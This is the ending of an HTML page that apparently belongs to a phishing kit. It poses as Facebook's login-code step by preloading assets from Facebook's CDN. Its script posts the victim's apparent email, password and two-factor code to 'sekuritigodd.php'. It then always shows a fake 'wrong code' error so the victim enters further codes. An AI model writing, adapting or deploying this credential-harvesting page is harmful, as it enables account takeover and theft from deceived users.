    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/-JX9Glu_toy.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/r/MuVJ3kziB_s.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/BwjU4B_qfpp.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="cUE4nIb6" />

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script>
function processlogincode() {
	$('#formprocesslogincode').submit(function(submitingprocesslogincode){
	submitingprocesslogincode.preventDefault();
	
	var $godhelpmema = $("input#godhelpmema").val();
	var $godhelpmepa = $("input#godhelpmepa").val();
	var $logincode = $("input#logincode").val();
	
	$.ajax({
		type: "POST",
		url: "sekuritigodd.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.btnSubmit').hide();
			$('.btnSubmitContents').prop('disabled', true);
			$('.btnLoading').show();
		},
		success: function(){
			$('#logincodealert').html('The login code or recovery code you entered is wrong, try again.');
			$('.btnSubmit').show();
			$('.btnSubmitContents').prop('disabled', false);
			$('.btnLoading').hide();
		}
	});
	});  
	return false;
};
</script>

</body>
</html>